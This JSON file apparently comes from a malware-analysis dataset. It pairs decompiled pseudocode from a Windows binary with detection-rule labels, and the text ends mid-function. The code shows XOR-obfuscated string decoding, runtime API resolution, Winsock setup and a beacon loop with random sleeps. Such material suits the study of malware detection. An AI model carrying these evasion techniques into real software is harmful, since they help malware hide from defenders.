{
    "00401010": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t fcn.00401010(void)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    if (*0x4366a0 == 0) {\n        iVar1 = 0;\n    }\n    else {\n        if (*0x436788 == 0x14) {\n            *0x436788 = 0;\n        }\n        if (*(*0x436788 * 0xc + 0x4366a0) == 0) {\n            *0x436788 = 0;\n        }\n        iVar1 = *0x436788 * 0xc + 0x436698;\n        *0x436788 = *0x436788 + 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 162
    },
    "004010f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool fcn.004010f0(void)\n\n{\n    return *0x4366a0 != 0;\n}\n",
        "token_count": 26
    },
    "00401140": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401140(uint hFile, uint lpBuffer, int32_t nNumberOfBytesToWrite)\n\n{\n    int32_t lpNumberOfBytesWritten;\n    int32_t var_4h;\n    \n    var_4h = (*_sym.imp.KERNEL32.dll_WriteFile)(hFile, lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, 0);\n    if ((var_4h == 0) || (nNumberOfBytesToWrite != lpNumberOfBytesWritten)) {\n        fcn.00401110(hFile);\n    }\n    return var_4h;\n}\n",
        "token_count": 132
    },
    "00401190": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401190(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint lpBuffer;\n    int32_t var_14h;\n    uint lpNumberOfBytesRead;\n    uint var_ch;\n    uint var_8h;\n    int32_t *hFile;\n    \n    var_8h = 0;\n    var_ch = 0;\n    lpBuffer = 0;\n    var_14h = 0;\n    var_34h = 1;\n    var_30h = 1;\n    var_2ch = arg_8h;\n    var_28h = arg_ch;\n    var_24h = 0;\n    var_20h = arg_10h;\n    var_1ch = arg_18h;\n    hFile = fcn.00401010();\n    if (*hFile == 0) {\n        var_ch = 0;\n    }\n    else {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(arg_14h, hFile[1], &var_8h, 0x1f0000, 0, 2);\n        iVar2 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar1);\n        if (iVar2 != 0) {\n            var_24h = var_8h;\n        }\n        iVar2 = fcn.00401140(*hFile, &var_34h, 0x1c);\n        if (iVar2 != 0) {\n            lpNumberOfBytesRead = 0;\n            iVar2 = (*_sym.imp.KERNEL32.dll_ReadFile)(*hFile, &lpBuffer, 8, &lpNumberOfBytesRead, 0);\n            if ((iVar2 != 0) && (var_14h == 0)) {\n                var_ch = 1;\n            }\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 485
    },
    "00401340": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00401340(uint arg_8h, uchar *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint *puVar4;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    code *var_ach;\n    code *var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    code *var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uchar var_84h;\n    uchar var_83h;\n    uchar var_82h;\n    uchar var_81h;\n    uchar var_80h;\n    uchar var_7fh;\n    uchar var_7eh;\n    uchar var_7dh;\n    uchar var_7ch;\n    uchar var_7bh;\n    uchar var_7ah;\n    uchar var_79h;\n    uchar var_78h;\n    uchar var_77h;\n    uchar var_76h;\n    uchar var_75h;\n    uchar var_74h;\n    uchar var_73h;\n    uchar var_72h;\n    uchar var_71h;\n    uint var_70h;\n    uchar var_6ch;\n    uchar var_6bh;\n    uchar var_6ah;\n    uchar var_69h;\n    uchar var_68h;\n    uchar var_67h;\n    uchar var_66h;\n    uchar var_65h;\n    uchar var_64h;\n    uchar var_63h;\n    uchar var_62h;\n    uchar var_61h;\n    uchar var_60h;\n    uchar var_5fh;\n    uchar var_5eh;\n    uint var_5ch;\n    uchar var_58h;\n    uchar var_57h;\n    uchar var_56h;\n    uchar var_55h;\n    uchar var_54h;\n    uchar var_53h;\n    uchar var_52h;\n    uchar var_51h;\n    uchar var_50h;\n    uchar var_4fh;\n    uint var_4ch;\n    uchar var_48h;\n    uchar var_47h;\n    uchar var_46h;\n    uchar var_45h;\n    uchar var_44h;\n    uchar var_43h;\n    uint8_t var_40h [4];\n    uchar var_3ch;\n    uchar var_3bh;\n    uint var_38h;\n    uchar var_34h;\n    uchar var_33h;\n    uint var_30h;\n    uchar var_2ch;\n    uchar var_2bh;\n    uint var_28h;\n    uchar var_24h;\n    uint *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puVar4 = &var_d0h;\n    for (iVar2 = 0x18; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    var_b8h = arg_8h;\n    var_b4h = 0;\n    var_1ch = 0;\n    var_a4h = 0;\n    var_4ch._0_1_ = 0x27;\n    var_4ch._1_1_ = 0x1f;\n    var_4ch._2_1_ = 5;\n    var_4ch._3_1_ = 1;\n    var_48h = 0x3d;\n    var_47h = 0x67;\n    var_46h = 0xf;\n    var_45h = 0xd;\n    var_44h = 1;\n    var_43h = 0x51;\n    var_28h._0_1_ = 0x49;\n    var_28h._1_1_ = 0x6b;\n    var_28h._2_1_ = 0x61;\n    var_28h._3_1_ = 0x6d;\n    var_24h = 0x51;\n    fcn.004012a0(10);\n    for (var_4h = 0; var_4h < 10; var_4h = var_4h + 1) {\n        fcn.00401280(var_4h, *(&var_4ch + var_4h) ^ *(&var_28h + var_4h % 5));\n    }\n    var_5ch._0_1_ = 0x31;\n    var_5ch._1_1_ = 0x30;\n    var_5ch._2_1_ = 0x7a;\n    var_5ch._3_1_ = 0x3b;\n    var_58h = 0;\n    var_57h = 0x58;\n    var_56h = 0x3b;\n    var_55h = 0x35;\n    var_54h = 0x5a;\n    var_53h = 0x28;\n    var_52h = 0;\n    var_51h = 0x45;\n    var_50h = 0x18;\n    var_4fh = 0x47;\n    var_30h._0_1_ = 0x6b;\n    var_30h._1_1_ = 0x47;\n    var_30h._2_1_ = 0x35;\n    var_30h._3_1_ = 0x4b;\n    var_2ch = 0x65;\n    var_2bh = 0x36;\n    fcn.004012a0(0xe);\n    for (var_8h = 0; var_8h < 0xe; var_8h = var_8h + 1) {\n        fcn.00401280(var_8h, *(&var_5ch + var_8h) ^ *(&var_30h + var_8h % 6));\n    }\n    uVar1 = fcn.00401270();\n    uVar1 = fcn.00401270(uVar1);\n    uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(uVar1);\n    var_a8h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    var_d0h = 0x18;\n    var_cch = 0;\n    var_c4h = 0;\n    var_c8h = 0;\n    var_c0h = 0;\n    var_bch = 0;\n    var_14h = (*var_a8h)(&var_a0h, 0x400, &var_d0h, &var_b8h);\n    if (-1 < var_14h) {\n        var_70h._0_1_ = 0x20;\n        var_70h._1_1_ = 0x31;\n        var_70h._2_1_ = 0x18;\n        var_70h._3_1_ = 0x26;\n        var_6ch = 0x22;\n        var_6bh = 0xc;\n        var_6ah = 0x2a;\n        var_69h = 0x34;\n        var_68h = 0x38;\n        var_67h = 0x35;\n        var_66h = 0x22;\n        var_65h = 0x11;\n        var_64h = 9;\n        var_63h = 0x12;\n        var_62h = 0x38;\n        var_61h = 0x3d;\n        var_60h = 0x22;\n        var_5fh = 0xc;\n        var_5eh = 0x7a;\n        var_38h._0_1_ = 0x7a;\n        var_38h._1_1_ = 0x46;\n        var_38h._2_1_ = 0x57;\n        var_38h._3_1_ = 0x56;\n        var_34h = 0x47;\n        var_33h = 0x62;\n        fcn.004012a0(0x13);\n        for (var_ch = 0; var_ch < 0x13; var_ch = var_ch + 1) {\n            fcn.00401280(var_ch, *(&var_70h + var_ch) ^ *(&var_38h + var_ch % 6));\n        }\n        uVar1 = fcn.00401270();\n        uVar1 = fcn.00401270(uVar1);\n        uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(uVar1);\n        var_ach = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        var_14h = (*var_ach)(var_a0h, 8, &var_8ch);\n        if (-1 < var_14h) {\n            var_88h._0_1_ = 0x6f;\n            var_88h._1_1_ = 0xe;\n            var_88h._2_1_ = 0x1e;\n            var_88h._3_1_ = 0x26;\n            var_84h = 0xd;\n            var_83h = 0x1a;\n            var_82h = 0x4c;\n            var_81h = 0x30;\n            var_80h = 0x21;\n            var_7fh = 0x35;\n            var_7eh = 7;\n            var_7dh = 0x1a;\n            var_7ch = 0x58;\n            var_7bh = 0x18;\n            var_7ah = 0x3b;\n            var_79h = 0x3a;\n            var_78h = 7;\n            var_77h = 6;\n            var_76h = 0x61;\n            var_75h = 0x16;\n            var_74h = 0x24;\n            var_73h = 0x36;\n            var_72h = 6;\n            var_71h = 0x68;\n            var_40h[0] = 0x35;\n            var_40h[1] = 0x79;\n            var_40h[2] = 0x4f;\n            var_40h[3] = 0x53;\n            var_3ch = 0x68;\n            var_3bh = 0x68;\n            fcn.004012a0(0x18);\n            for (var_10h = 0; var_10h < 0x18; var_10h = var_10h + 1) {\n                fcn.00401280(var_10h, *(&var_88h + var_10h) ^ var_40h[var_10h % 6]);\n            }\n            uVar1 = fcn.00401270();\n            uVar1 = fcn.00401270(uVar1);\n            uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(uVar1);\n            var_9ch = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n            var_14h = (*var_9ch)(var_8ch, 1, 0, 0, &var_1ch);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, var_1ch);\n            var_20h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            if (var_20h != NULL) {\n                var_14h = (*var_9ch)(var_8ch, 1, var_20h, var_1ch, &var_1ch);\n                if (-1 < var_14h) {\n                    puVar3 = *var_20h;\n                    for (iVar2 = 0x1c; iVar2 != 0; iVar2 = iVar2 + -1) {\n                        *arg_ch = *puVar3;\n                        puVar3 = puVar3 + 1;\n                        arg_ch = arg_ch + 1;\n                    }\n                    var_a4h = 1;\n                }\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_20h);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            }\n            fcn.004112d0(var_8ch);\n            fcn.004012d0();\n        }\n        fcn.004112d0(var_a0h);\n        fcn.004012d0();\n    }\n    var_b0h = var_a4h;\n    fcn.004012d0();\n    fcn.004012d0();\n    return var_b0h;\n}\n",
        "token_count": 2988
    },
    "00401870": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401870(uint *arg_8h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uchar *puVar5;\n    uint var_1b4h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_10h = arg_8h;\n    var_20h = *0x436b98;\n    var_8h = *arg_8h;\n    var_24h = 0;\n    (*_sym.imp.WS2_32.dll_WSAStartup)(0x202, &var_1b4h);\n    puVar4 = &var_1ch;\n    for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    puVar5 = 0x4367bc;\n    for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_OutputDebugStringA)(\"WMA 0\");\n    cVar1 = fcn.00414250(&var_1ch);\n    if (cVar1 != '\\0') {\n        iVar3 = fcn.00401cb0(&var_1ch, 0x4367bc, 0);\n        if (iVar3 != 0) {\n            (*_sym.imp.KERNEL32.dll_OutputDebugStringA)(\"WMA 1\");\n            fcn.004245f0(&var_1ch);\n            (*_sym.imp.KERNEL32.dll_SetEvent)(*0x436b4c);\n        }\n    }\n    while (*0x436b04 == 0) {\n        var_4h = 0;\n        var_ch = fcn.00401a70(var_8h, &var_4h);\n        if (var_ch != -1) {\n            var_14h = fcn.004213b0(var_8h);\n            if ((var_14h != var_4h) && (var_4h != 0)) {\n                iVar3 = fcn.004019d0(var_ch * 0x20 + 0x436508, var_8h, &var_1ch, var_ch, 0x1bb);\n                if ((iVar3 != 0) && ((var_10h[1] != 0 && (var_14h != 0)))) {\n                    (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n                }\n            }\n        }\n        uVar2 = fcn.00401850(&var_20h);\n        (*_sym.imp.KERNEL32.dll_Sleep)(uVar2 % 600000 + 60000);\n    }\n    return 0;\n}\n",
        "token_count": 698
    },
    "004019d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004019d0(uint arg_8h, uint arg_ch, int32_t *arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    var_4h = 0;\n    iVar1 = fcn.0040b910(arg_8h, arg_ch, arg_10h, arg_18h);\n    if (iVar1 == 0) {\n        (*_sym.imp.KERNEL32.dll_OutputDebugStringA)(\"WMA 2\");\n    }\n    else if ((*arg_10h != 0) && (arg_10h[1] != 0)) {\n        fcn.00413b50(arg_10h);\n        iVar1 = fcn.00401cb0(arg_10h, 0x4367bc, arg_14h);\n        if (iVar1 == 0) {\n            fcn.004245f0(arg_10h);\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_OutputDebugStringA)(\"WMA 3\");\n            fcn.004245f0(arg_10h);\n            (*_sym.imp.KERNEL32.dll_SetEvent)(*0x436b4c);\n            var_4h = 1;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 294
    },
    "00401a70": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00401a70(uint arg_8h, int32_t *arg_ch)\n\n{\n    uint arg_8h_00;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint var_58h;\n    uchar var_54h;\n    uchar var_53h;\n    uchar var_52h;\n    uchar var_51h;\n    uchar var_50h;\n    uchar var_4fh;\n    uchar var_4eh;\n    uchar var_4dh;\n    uchar var_4ch;\n    uchar var_4bh;\n    uchar var_4ah;\n    uchar var_49h;\n    uchar var_48h;\n    uchar var_47h;\n    uchar var_46h;\n    uchar var_45h;\n    uchar var_44h;\n    uchar var_43h;\n    uchar var_42h;\n    uchar var_41h;\n    uchar var_40h;\n    uchar var_3fh;\n    uchar var_3eh;\n    uchar var_3dh;\n    uchar var_3ch;\n    uchar var_3bh;\n    uchar var_3ah;\n    uchar var_39h;\n    uchar var_38h;\n    uchar var_37h;\n    uchar var_36h;\n    uchar var_35h;\n    uchar var_34h;\n    uchar var_33h;\n    uchar var_32h;\n    uchar var_31h;\n    uint8_t var_30h [4];\n    uchar var_2ch;\n    uchar var_2bh;\n    int32_t var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    char *var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_20h = -1;\n    var_24h = *0x436b98;\n    var_58h._0_1_ = 0x56;\n    var_58h._1_1_ = 10;\n    var_58h._2_1_ = 0x52;\n    var_58h._3_1_ = 0x26;\n    var_54h = 0x27;\n    var_53h = 0x3e;\n    var_52h = 0x50;\n    var_51h = 0;\n    var_50h = 0x58;\n    var_4fh = 0x28;\n    var_4eh = 0x29;\n    var_4dh = 0x34;\n    var_4ch = 0x5a;\n    var_4bh = 6;\n    var_4ah = 0x5e;\n    var_49h = 0x32;\n    var_48h = 0x33;\n    var_47h = 0x2a;\n    var_46h = 0x44;\n    var_45h = 0x1c;\n    var_44h = 0x44;\n    var_43h = 0x34;\n    var_42h = 0x35;\n    var_41h = 0x20;\n    var_40h = 0x4e;\n    var_3fh = 0x12;\n    var_3eh = 0x1f;\n    var_3dh = 0x6f;\n    var_3ch = 0x1d;\n    var_3bh = 0x69;\n    var_3ah = 5;\n    var_39h = 0x5b;\n    var_38h = 5;\n    var_37h = 0x77;\n    var_36h = 0x74;\n    var_35h = 0x6f;\n    var_34h = 0xf;\n    var_33h = 0x51;\n    var_32h = 1;\n    var_31h = 0x42;\n    var_30h[0] = 0x37;\n    var_30h[1] = 0x68;\n    var_30h[2] = 0x31;\n    var_30h[3] = 0x42;\n    var_2ch = 0x42;\n    var_2bh = 0x58;\n    fcn.004012a0(0x28);\n    for (var_8h = 0; var_8h < 0x28; var_8h = var_8h + 1) {\n        fcn.00401280(var_8h, *(&var_58h + var_8h) ^ var_30h[var_8h % 6]);\n    }\n    var_4h = 0;\n    do {\n        if (9 < var_4h) {\ncode_r0x00401c93:\n            var_28h = var_20h;\n            fcn.004012d0();\n            return var_28h;\n        }\n        var_ch = var_4h * 0x20 + 0x436508;\n        var_18h = 1;\n        for (var_10h = 0; var_10h < 0x20; var_10h = var_10h + 1) {\n            if (var_ch[var_4h] != '\\0') {\n                iVar2 = var_ch[var_4h];\n                arg_8h_00 = fcn.00401270();\n                iVar2 = fcn.0041b2e0(arg_8h_00, iVar2);\n                if (iVar2 == 0) {\n                    var_18h = 0;\n                    break;\n                }\n            }\n        }\n        if (((*var_ch != '\\0') && (var_ch[0x1f] == '\\0')) && (var_18h != 0)) {\n            var_1ch = fcn.004212f0(var_ch, arg_8h);\n            if (var_1ch != -1) {\n                *arg_ch = var_1ch;\n                var_20h = var_4h;\n                goto code_r0x00401c93;\n            }\n            uVar1 = fcn.00401850(&var_24h);\n            (*_sym.imp.KERNEL32.dll_Sleep)(uVar1 % 600000 + 60000);\n        }\n        var_4h = var_4h + 1;\n    } while( true );\n}\n",
        "token_count": 1457
    },
    "00401cb0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401cb0(int32_t *arg_8h, uint *arg_ch, int32_t lpString2)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    uint *puVar3;\n    uchar *puVar4;\n    uint var_e4h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uchar *lpString1;\n    uchar *var_8h;\n    int32_t var_4h;\n    \n    var_14h = 0;\n    var_10h = 0xc0000001;\n    puVar3 = &var_1ch;\n    for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = &var_e4h;\n    for (iVar1 = 200; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    if ((*arg_8h != 0) && (arg_8h[1] != 0)) {\n        var_10h = fcn.0041f630(arg_8h, &var_1ch);\n        if (-1 < var_10h) {\n            var_8h = fcn.00423a00(\"DDDD\", 4, var_18h, var_1ch);\n            if (var_8h != NULL) {\n                puVar2 = var_8h;\n                for (iVar1 = 0x184; iVar1 != 0; iVar1 = iVar1 + -1) {\n                    *puVar2 = 0;\n                    puVar2 = puVar2 + 1;\n                }\n                puVar2 = 0x436508;\n                puVar4 = var_8h;\n                for (iVar1 = 0x184; iVar1 != 0; iVar1 = iVar1 + -1) {\n                    *puVar4 = *puVar2;\n                    puVar2 = puVar2 + 1;\n                    puVar4 = puVar4 + 1;\n                }\n                puVar2 = var_8h;\n                for (iVar1 = 0x140; iVar1 != 0; iVar1 = iVar1 + -1) {\n                    *puVar2 = 0;\n                    puVar2 = puVar2 + 1;\n                }\n                lpString1 = var_8h;\n                (*_sym.imp.KERNEL32.dll_lstrcpyA)(var_8h, lpString2 * 0x20 + 0x436508);\n                for (var_4h = 0; var_4h < 9; var_4h = var_4h + 1) {\n                    if (*(var_4h * 0x20 + 0x436508) != '\\0') {\n                        (*_sym.imp.KERNEL32.dll_lstrcpyA)(lpString1 + (var_4h + 1) * 0x20, var_4h * 0x20 + 0x436508);\n                    }\n                }\n            }\n            fcn.004245f0(arg_ch);\n            *arg_ch = var_1ch;\n            arg_ch[1] = var_18h;\n            var_14h = 1;\n        }\n    }\n    return var_14h;\n}\n",
        "token_count": 777
    },
    "00401e10": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_90h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00401e10(uchar *arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint var_90h;\n    uchar var_8ch;\n    uchar var_8bh;\n    uchar var_8ah;\n    uchar var_89h;\n    uchar var_88h;\n    uchar var_87h;\n    uchar var_86h;\n    uchar var_85h;\n    uchar var_84h;\n    uchar var_83h;\n    uchar var_82h;\n    uchar var_81h;\n    uchar var_80h;\n    uchar var_7fh;\n    uchar var_7eh;\n    uchar var_7dh;\n    uchar var_7ch;\n    uchar var_7bh;\n    uchar var_7ah;\n    uint var_78h;\n    uchar var_74h;\n    uchar var_73h;\n    uchar var_72h;\n    uchar var_71h;\n    uchar var_70h;\n    uchar var_6fh;\n    uchar var_6eh;\n    uchar var_6dh;\n    uchar var_6ch;\n    uchar var_6bh;\n    uchar var_6ah;\n    uchar var_69h;\n    uchar var_68h;\n    uchar var_67h;\n    uchar var_66h;\n    uchar var_65h;\n    uchar var_64h;\n    uchar var_63h;\n    uchar var_62h;\n    uint var_60h;\n    uchar var_5ch;\n    uchar var_5bh;\n    uchar var_5ah;\n    uchar var_59h;\n    uchar var_58h;\n    uchar var_57h;\n    uchar var_56h;\n    uint var_54h;\n    uchar var_50h;\n    uchar var_4fh;\n    uchar var_4eh;\n    uchar var_4dh;\n    uchar var_4ch;\n    uchar var_4bh;\n    uint8_t var_48h [4];\n    uchar var_44h;\n    uint var_40h;\n    uchar var_3ch;\n    uint var_38h;\n    uchar var_34h;\n    uint var_30h;\n    uchar var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_28h = 0;\n    if ((((*0x43678c | *0x436790) == 0) || ((*0x436794 | *0x436798) == 0)) || ((*0x43679c | *0x4367a0) == 0)) {\n        var_28h = 0x7f;\n        var_54h._0_1_ = 0x27;\n        var_54h._1_1_ = 0x1f;\n        var_54h._2_1_ = 5;\n        var_54h._3_1_ = 1;\n        var_50h = 0x3d;\n        var_4fh = 0x67;\n        var_4eh = 0xf;\n        var_4dh = 0xd;\n        var_4ch = 1;\n        var_4bh = 0x51;\n        var_30h._0_1_ = 0x49;\n        var_30h._1_1_ = 0x6b;\n        var_30h._2_1_ = 0x61;\n        var_30h._3_1_ = 0x6d;\n        var_2ch = 0x51;\n        fcn.004012a0(10);\n        for (var_8h = 0; var_8h < 10; var_8h = var_8h + 1) {\n            fcn.00401280(var_8h, *(&fcn.00401e10::var_54h + var_8h) ^ *(&fcn.00401e10::var_30h + var_8h % 5));\n        }\n        uVar1 = fcn.00401270();\n        var_20h = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(uVar1);\n        if (var_20h == 0) {\n            var_90h = 0x401f06;\n            fcn.004012d0();\n        }\n        else {\n            var_60h._0_1_ = 0x22;\n            var_60h._1_1_ = 0x20;\n            var_60h._2_1_ = 0x42;\n            var_60h._3_1_ = 0x24;\n            var_5ch = 0xd;\n            var_5bh = 0xf;\n            var_5ah = 0x20;\n            var_59h = 0x74;\n            var_58h = 4;\n            var_57h = 0xe;\n            var_56h = 0x6e;\n            var_38h._0_1_ = 0x6e;\n            var_38h._1_1_ = 0x44;\n            var_38h._2_1_ = 0x30;\n            var_38h._3_1_ = 0x68;\n            var_34h = 0x62;\n            var_90h = 0xb;\n            fcn.004012a0(0xb);\n            for (var_ch = 0; var_ch < 0xb; var_ch = var_ch + 1) {\n                fcn.00401280(var_ch, *(&fcn.00401e10::var_60h + var_ch) ^ *(&fcn.00401e10::var_38h + var_ch % 5));\n            }\n            uVar1 = fcn.00401270();\n            *0x43678c = fcn.0041c160(var_20h, uVar1);\n            *0x436790 = *0x43678c >> 0x1f;\n            if ((*0x43678c | *0x436790) == 0) {\n                fcn.004012d0();\n                fcn.004012d0();\n            }\n            else {\n                var_78h._0_1_ = 0x74;\n                var_78h._1_1_ = 0x1e;\n                var_78h._2_1_ = 0x1f;\n                var_78h._3_1_ = 6;\n                var_74h = 0x56;\n                var_73h = 0x4c;\n                var_72h = 0x2a;\n                var_71h = 0x1f;\n                var_70h = 0x2e;\n                var_6fh = 0x50;\n                var_6eh = 0x5d;\n                var_6dh = 0x1e;\n                var_6ch = 0x18;\n                var_6bh = 0x33;\n                var_6ah = 0x56;\n                var_69h = 0x79;\n                var_68h = 0x1e;\n                var_67h = 9;\n                var_66h = 0x33;\n                var_65h = 0x56;\n                var_64h = 0x4b;\n                var_63h = 9;\n                var_62h = 0x6d;\n                var_40h._0_1_ = 0x38;\n                var_40h._1_1_ = 0x7a;\n                var_40h._2_1_ = 0x6d;\n                var_40h._3_1_ = 0x41;\n                var_3ch = 0x33;\n                fcn.004012a0(0x17);\n                for (var_10h = 0; var_10h < 0x17; var_10h = var_10h + 1) {\n                    fcn.00401280(var_10h, *(&fcn.00401e10::var_78h + var_10h) ^ *(&fcn.00401e10::var_40h + var_10h % 5))\n                    ;\n                }\n                uVar1 = fcn.00401270();\n                *0x436794 = fcn.0041c160(var_20h, uVar1);\n                *0x436798 = *0x436794 >> 0x1f;\n                if ((*0x436794 | *0x436798) == 0) {\n                    fcn.004012d0();\n                    fcn.004012d0();\n                    fcn.004012d0();\n                }\n                else {\n                    var_90h = 0x3e054416;\n                    var_8ch = 0x20;\n                    var_8bh = 0x38;\n                    var_8ah = 0x56;\n                    var_89h = 0x36;\n                    var_88h = 0x38;\n                    var_87h = 0x19;\n                    var_86h = 0x25;\n                    var_85h = 0x41;\n                    var_84h = 0x21;\n                    var_83h = 0x39;\n                    var_82h = 0x2e;\n                    var_81h = 0x20;\n                    var_80h = 0x7e;\n                    var_7fh = 0x30;\n                    var_7eh = 0x21;\n                    var_7dh = 0x20;\n                    var_7ch = 0x3e;\n                    var_7bh = 0x4a;\n                    var_7ah = 0x55;\n                    var_48h[0] = 0x4c;\n                    var_48h[1] = 0x33;\n                    var_48h[2] = 0x55;\n                    var_48h[3] = 0x4c;\n                    var_44h = 0x4f;\n                    fcn.004012a0(0x17);\n                    for (var_14h = 0; var_14h < 0x17; var_14h = var_14h + 1) {\n                        fcn.00401280(var_14h, 